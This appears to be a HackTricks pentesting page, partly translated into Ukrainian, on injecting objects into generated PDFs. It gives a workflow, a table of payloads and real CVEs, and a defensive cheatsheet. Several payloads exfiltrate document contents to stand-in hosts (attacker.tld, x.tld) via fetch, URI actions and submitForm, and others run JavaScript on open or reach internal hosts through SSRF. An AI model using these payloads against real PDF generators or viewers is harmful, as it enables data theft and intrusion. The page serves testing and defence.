# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Якщо ваш ввід відображається всередині PDF-файлу, ви можете спробувати інʼєктувати PDF-дані для виконання JavaScript, виконання SSRF або викрадення вмісту PDF.**
PDF syntax is extremely permissive – if you can break out of the string or dictionary that is embedding your input you can append totally new objects (or new keys in the same object) that Acrobat/Chrome will happily parse.
Since 2024 a wave of bug-bounty reports have shown that *one unescaped parenthesis or back-slash is enough* for full script execution.

## TL;DR – Modern Attack Workflow (2024-2026)
1. Знайдіть будь-яке значення, контрольоване користувачем, яке опиняється всередині **(parenthesis string)**, `/URI ( … )` або `/JS ( … )` поля в згенерованому PDF.
2. Inject `) ` (closing the string) followed by one of the primitives below and finish with another opening parenthesis to keep the syntax valid.
3. Доставте шкідливий PDF жертві (або до backend service, який автоматично рендерить файл – чудово підходить для blind bugs).
4. Your payload runs in the PDF viewer:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Перший `)` закриває оригінальний URI рядок, після чого ми додаємо новий **Action** dictionary, який Acrobat виконуватиме при кліку на посилання.*

## Корисні примітиви ін'єкції
| Мета | Payload Snippet | Пояснення |
|------|-----------------|----------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Виконується миттєво при відкритті документа (працює в Acrobat, не в Chrome). |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Працює в PDFium та Acrobat, якщо ви контролюєте `/Link` анотацію. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Поєднайте з `this.getPageNthWord` у JS, щоб вкрасти вміст. |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | Те ж саме, але ціль — внутрішній URL — корисно, коли PDF рендериться бек-офісними сервісами, які поважають `/URI`. |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Прикріпіть до словника Page/Annotation/Form, щоб виконати при відкритті/фокусі. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Якщо бібліотека дозволяє інжектувати символи нового рядка, ви можете створити повністю нові об'єкти. |

## Вбудовані дії як цілі для ін'єкції
PDF-переглядачі трактують **embedded actions**, такі як `/OpenAction` та `/AA` (Additional Actions), як основні можливості, які можуть виконуватися при відкритті документа або при спрацьовуванні певної події. Якщо ви можете інжектувати в будь-який словник, що приймає дії (Catalog, Page, Annotation, or Form field), ви можете приєднати дерево `/AA` і спрацювати JavaScript при відкритті/фокусі.

Приклад payload для **generator-side object injection** (закрийте оригінальний рядок/словник та інжектуйте `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Цей патерн відповідає нещодавнім проблемам jsPDF, коли введення, контрольоване атакувальником, передане у `addJS` (або певні поля AcroForm), виходить за межі призначеного JavaScript-рядка та інжектує словник **Additional Action**.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) опублікував однорядковий скрипт, який перераховує всі об'єкти всередині невідомого документа — корисно, коли ви не можете побачити згенерований PDF:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Код ітерує Acrobat DOM і робить вихідні запити для кожної пари властивість/значення, даючи вам *JSON-ish* дамп файлу.
Див. white-paper “Portable Data **ex**Filtration” для повної методики.

## Real-World Bugs (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: рядки, контрольовані атакуючим, можуть закрити JS-літерал і інжектити `/AA` → `/O` → `/JavaScript` дії, які запускаються при відкритті/фокусі.
* **CVE-2024-4367** – Arbitrary JavaScript execution in Firefox’s PDF.js prior to 4.2.67 дозволяло обійти sandbox за допомогою спеціально сконструйованої `/JavaScript` дії.
* **Bug bounty 2024-05** – Велика fintech-компанія дозволяла нотатки клієнтів, які потрапляли в `/URI`; звіт виплатили $10k після демонстрації SSRF до внутрішнього хоста метаданих з використанням `file:///` URI.
* **CVE-2023-26155** – `node-qpdf` command-injection через ненормалізований шлях до PDF підкреслює важливість екранування зворотних слешів і дужок навіть *перед* PDF-слоєм.

## Defensive Cheatsheet
1. **Never concatenate raw user input** всередині `(`…`)` рядків або імен. Екраніруйте `\`, `(`, `)` відповідно до §7.3 специфікації PDF або використовуйте hex strings `<...>`.
2. Якщо ви будуєте посилання, надавайте перевагу `/URI (https://…)`, які ви *повністю* URL-енкодуєте; блокувати схеми `javascript:` у клієнтських переглядачах.
3. Видаляйте або перевіряйте словники `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` та `/ImportData` при постобробці PDF.
4. На сервері рендерьте ненадійні PDFs за допомогою *headless converter* (наприклад qpdf –decrypt –linearize), який видаляє JavaScript і зовнішні дії.
5. Тримайте переглядачі PDF в актуальному стані; PDF.js < 4.2.67 і Acrobat Reader до патчів липня 2024 дозволяють тривіальне виконання коду.
6. Якщо ви використовуєте генератори на стороні клієнта (наприклад jsPDF), ніколи не передавайте ненадійні дані в `addJS` або AcroForm сеттери, які опиняються всередині PDF action dictionaries.

## References
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (оновлено травень 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (квітень 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (лютий 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (вересень 2025) – вбудовані дії, такі як OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
